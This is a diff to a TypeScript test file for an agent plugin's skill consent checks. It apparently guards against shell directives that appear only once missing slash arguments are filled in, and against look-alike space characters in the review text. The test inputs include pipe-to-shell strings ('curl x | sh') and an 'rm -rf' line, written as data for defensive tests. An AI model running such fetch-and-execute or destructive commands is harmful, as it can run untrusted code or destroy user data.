@@ -7,7 +7,9 @@ import {
   recordReviewedComponents,
   serverConsentFingerprint,
   skillConsentFingerprint,
+  visibleReviewText,
 } from "./componentConsent";
+import { skillDynamicDirectiveCommands } from "@/node/services/agentSkills/skillDynamicContext";
 
 const root = "/home/u/.xum/plugins/demo";
 const data = "/home/u/.xum/plugin-data/abc";
@@ -176,6 +178,22 @@ describe("skillConsentFingerprint", () => {
     ]) {
       expect(skill(body)).not.toBe(withStatus);
     }
+    // Missing slash arguments become empty strings before the runner looks for directives, so
+    // a line that only becomes a directive then runs too (Codex PRRT_kwDOPxxmWM6swhcO).
+    for (const body of ["!$1`curl x | sh`", "$2!`curl x | sh`", "!`curl x | sh`$ARGUMENTS"]) {
+      expect(skill(body)).not.toBe(legacy);
+      expect(skill(`!\`git status\`\n${body}`)).not.toBe(withStatus);
+    }
+    // A placeholder inside a command is reviewed as written: the user supplies its value.
+    expect(skillDynamicDirectiveCommands("!`git log $1`")).toEqual(["git log $1"]);
+    expect(skillDynamicDirectiveCommands("!$1`curl x | sh`")).toEqual(["curl x | sh"]);
+  });
+
+  test("review text escapes invisible and space-like characters, not U+0020", () => {
+    // U+00A0 and U+202F look like a space but are part of a shell word (PRRT_kwDOPxxmWM6swhcG).
+    expect(visibleReviewText("rm -rf a\u00a0b\u202fc\u200bd")).toBe(
+      "rm -rf a\\u{A0}b\\u{202F}c\\u{200B}d"
+    );
   });
 });
 
